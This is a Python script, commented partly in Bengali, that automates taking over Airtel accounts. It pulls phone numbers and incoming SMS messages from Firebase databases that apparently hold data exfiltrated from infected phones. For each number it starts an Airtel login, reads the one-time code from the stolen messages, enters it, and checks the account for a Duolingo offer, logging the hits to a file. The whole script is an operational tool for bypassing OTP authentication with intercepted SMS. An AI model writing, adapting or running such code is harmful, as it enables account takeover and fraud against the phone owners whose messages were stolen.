#!/usr/bin/env python3
"""
Airtel Duolingo Auto Scanner
- Numbers একটার পর একটা automatically test করে
- OTP Firebase থেকে auto নেয়
- Duolingo পেলে link save করে থামে (বা continue করে)
"""

import asyncio
import aiohttp
import re
import os
import sys
from datetime import datetime

# ── CONFIG ────────────────────────────────────────────────────────────────────
print("Firebase URLs (comma separated):")
raw_urls = input("> ").strip()
FIREBASE_URLS = [u.strip().rstrip("/") for u in raw_urls.split(",") if u.strip()]

print("Firebase Auth Key (blank if none):")
FIREBASE_KEY = input("> ").strip()

print("Delay between numbers in seconds (default 5):")
_delay = input("> ").strip()
DELAY = int(_delay) if _delay.isdigit() else 5

AIRTEL_LOGIN_URL  = "https://www.airtel.in/manage-account/login"
AIRTEL_THANKS_URL = "https://www.airtel.in/thanks/"
RESULTS_FILE = "airtel_results.txt"

# ── HELPERS ───────────────────────────────────────────────────────────────────

def fb_url(base, path, extra=""):
    url = f"{base}/{path}"
    params = []
    if FIREBASE_KEY:
        params.append(f"auth={FIREBASE_KEY}")
    if extra:
        params.append(extra)
    if params:
        url += "?" + "&".join(params)
    return url

REGIONAL_DIGITS = str.maketrans(
    "०१२३४५६७८९" "০১২৩৪৫৬৭৮৯" "੦੧੨੩੪੫੬੭੮੯",
    "0123456789" * 3
)

def normalize(text):
    return text.translate(REGIONAL_DIGITS)

def log(msg, end="\n"):
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"[{ts}] {msg}", end=end, flush=True)

def save_result(phone, status, link=""):
    with open(RESULTS_FILE, "a", encoding="utf-8") as f:
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        f.write(f"{ts} | {phone} | {status} | {link}\n")

async def get_devices(session):
    devices = []
    for fb_base in FIREBASE_URLS:
        db_name = fb_base.split("//")[-1].split(".")[0]
        try:
            async with session.get(fb_url(fb_base, "clients.json"),
                                   timeout=aiohttp.ClientTimeout(total=20)) as r:
                data = await r.json()
            if not isinstance(data, dict):
                continue
            for dev_id, info in data.items():
                if not isinstance(info, dict):
                    continue
                phone = str(info.get("phone") or info.get("number") or
                            info.get("mobile") or "").strip().lstrip("+").lstrip("91")
                if len(phone) == 10:
                    devices.append({"device_id": dev_id, "phone": phone,
                                    "fb_base": fb_base, "db_name": db_name})
        except Exception as e:
            print(f"  ⚠ {db_name}: {e}")
    return devices

async def get_msg_keys(session, fb_base, device_id):
    try:
        async with session.get(
            fb_url(fb_base, f"messages/{device_id}.json", "shallow=true"),
            timeout=aiohttp.ClientTimeout(total=10)
        ) as r:
            data = await r.json()
        return set(data.keys()) if isinstance(data, dict) else set()
    except Exception:
        return set()

async def poll_otp(session, fb_base, device_id, known_keys, timeout=90):
    import time
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            async with session.get(
                fb_url(fb_base, f"messages/{device_id}.json", "shallow=true"),
                timeout=aiohttp.ClientTimeout(total=8)
            ) as r:
                shallow = await r.json()
            if isinstance(shallow, dict):
                new_keys = [k for k in shallow if k not in known_keys]
                for key in new_keys:
                    try:
                        async with session.get(
                            fb_url(fb_base, f"messages/{device_id}/{key}.json"),
                            timeout=aiohttp.ClientTimeout(total=8)
                        ) as r:
                            msg = await r.json()
                    except Exception:
                        continue
                    if isinstance(msg, dict):
                        text = ""
                        for field in ("message", "body", "text", "content", "smsBody"):
                            v = msg.get(field, "")
                            if v and isinstance(v, str):
                                text = v; break
                        if not text:
                            text = str(msg)
                        m = re.search(r'(?<!\d)(\d{4,6})(?!\d)', normalize(text))
                        if m:
                            return m.group(1)
                    known_keys.add(key)
        except Exception:
            pass
        await asyncio.sleep(2.5)
    return None

# ── PER-NUMBER FLOW ───────────────────────────────────────────────────────────

async def test_number(session, page, context, device):
    phone     = device["phone"]
    device_id = device["device_id"]
    fb_base   = device["fb_base"]

    log(f"▶ +91{phone}  [{device['db_name']}]")

    # Firebase snapshot
    known_keys = await get_msg_keys(session, fb_base, device_id)

    # ── Login ─────────────────────────────────────────────────────────────────
    try:
        await page.goto(AIRTEL_LOGIN_URL, wait_until="domcontentloaded", timeout=45000)
        await asyncio.sleep(2)
    except Exception as e:
        log(f"  ✗ Page load failed: {e}")
        save_result(phone, "PAGE_LOAD_FAILED")
        return "skip"

    # Fill phone
    filled = False
    for sel in ['input[placeholder*="mobile" i]', 'input[type="tel"]',
                'input[maxlength="10"]', 'input[name*="mobile" i]']:
        try:
            el = page.locator(sel).first
            if await el.count() > 0:
                await el.wait_for(state="visible", timeout=3000)
                await el.fill(phone)
                filled = True; break
        except Exception:
            continue

    if not filled:
        log(f"  ✗ Phone input not found")
        save_result(phone, "NO_PHONE_INPUT")
        return "skip"

    await asyncio.sleep(0.5)

    # Click OTP button
    otp_sent = False
    for sel in ['button:has-text("Send OTP")', 'button:has-text("SEND OTP")',
                'button:has-text("Get OTP")', 'button:has-text("GET OTP")',
                'button:has-text("Generate OTP")', 'button[type="submit"]']:
        try:
            el = page.locator(sel).first
            if await el.count() > 0:
                await el.wait_for(state="visible", timeout=3000)
                await el.click()
                otp_sent = True; break
        except Exception:
            continue

    if not otp_sent:
        log(f"  ✗ OTP button not found")
        save_result(phone, "NO_OTP_BUTTON")
        return "skip"

    log(f"  → OTP sent, polling Firebase...", end="")

    # ── Poll OTP ──────────────────────────────────────────────────────────────
    otp = await poll_otp(session, fb_base, device_id, known_keys, timeout=90)

    if not otp:
        log(f" timeout")
        save_result(phone, "OTP_TIMEOUT")
        return "skip"

    log(f" got {otp}")

    # ── Enter OTP ─────────────────────────────────────────────────────────────
    otp_filled = False
    for sel in ['input[placeholder*="OTP" i]', 'input[maxlength="4"]',
                'input[maxlength="6"]', 'input[type="number"]', 'input[type="tel"]']:
        try:
            inputs = await page.locator(sel).all()
            if len(inputs) >= 4:
                for i, digit in enumerate(otp[:len(inputs)]):
                    await inputs[i].fill(digit)
                    await asyncio.sleep(0.1)
                otp_filled = True; break
            elif inputs:
                await inputs[0].fill(otp)
                otp_filled = True; break
        except Exception:
            continue

    if not otp_filled:
        log(f"  ✗ OTP input not found")
        save_result(phone, "NO_OTP_INPUT")
        return "skip"

    await asyncio.sleep(0.5)

    # Click Login
    for sel in ['button:has-text("LOGIN")', 'button:has-text("Login")',
                'button:has-text("Verify")', 'button:has-text("VERIFY")',
                'button:has-text("Submit")', 'button:has-text("Continue")']:
        try:
            el = page.locator(sel).first
            if await el.count() > 0:
                await el.wait_for(state="visible", timeout=4000)
                await el.click()
                break
        except Exception:
            continue

    await asyncio.sleep(3)

    # ── Thanks page ───────────────────────────────────────────────────────────
    try:
        await page.goto(AIRTEL_THANKS_URL, wait_until="domcontentloaded", timeout=45000)
        await asyncio.sleep(4)
    except Exception as e:
        log(f"  ✗ Thanks page failed: {e}")
        save_result(phone, "THANKS_PAGE_FAILED")
        return "skip"

    body = await page.inner_text("body")
    has_duo = "duolingo" in body.lower()

    if has_duo:
        log(f"  ✅ DUOLINGO OFFER FOUND!")
        save_result(phone, "DUOLINGO_FOUND")
        return "found"
    else:
        log(f"  ✗ No Duolingo offer")
        save_result(phone, "NO_OFFER")
        return "skip"

# ── MAIN ──────────────────────────────────────────────────────────────────────

async def main():
    from playwright.async_api import async_playwright

    async with aiohttp.ClientSession() as session:
        log(f"Scanning {len(FIREBASE_URLS)} Firebase DB(s)...")
        devices = await get_devices(session)
        if not devices:
            log("❌ No devices found.")
            return

        log(f"✅ {len(devices)} devices found. Starting auto scan...\n")
        log(f"Results saved to: {os.path.abspath(RESULTS_FILE)}\n")

        async with async_playwright() as pw:
            browser = await pw.chromium.launch(
                headless=False,
                slow_mo=100,
                args=["--start-maximized"]
            )
            context = await browser.new_context(
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
                viewport={"width": 1280, "height": 800},
            )
            page = await context.new_page()

            found_count = 0
            skip_count  = 0

            for i, device in enumerate(devices):
                log(f"\n[{i+1}/{len(devices)}] ", end="")
                result = await test_number(session, page, context, device)

                if result == "found":
                    found_count += 1
                    log(f"\n🎉 Found {found_count} Duolingo link(s) so far!")
                    cont = input("Continue scanning? [y/n]: ").strip().lower()
                    if cont != 'y':
                        break
                else:
                    skip_count += 1

                if i < len(devices) - 1:
                    await asyncio.sleep(DELAY)

            log(f"\n\n{'='*50}")
            log(f"Scan complete: {found_count} found, {skip_count} skipped/no offer")
            log(f"Results: {os.path.abspath(RESULTS_FILE)}")

            input("\nPress ENTER to close browser...")
            await browser.close()

if __name__ == "__main__":
    asyncio.run(main())
